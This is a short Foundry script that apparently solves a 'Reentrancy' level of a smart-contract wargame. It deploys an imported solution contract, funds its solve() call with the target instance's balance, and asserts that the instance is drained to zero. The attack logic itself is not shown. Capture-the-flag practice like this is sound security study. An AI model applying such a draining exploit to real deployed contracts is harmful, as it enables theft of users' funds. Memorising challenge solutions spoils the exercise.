// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/10_IReentrancy.sol";
import "../src/10_ReentrancySolution.sol";

contract ReentrancyPOCScript is Script {
    function run() external {
        vm.startBroadcast();

        ReentrancySolution solution = new ReentrancySolution();
        solution.solve{value: address(INSTANCE).balance}();

        assert(address(INSTANCE).balance == 0);

        vm.stopBroadcast();
    }
}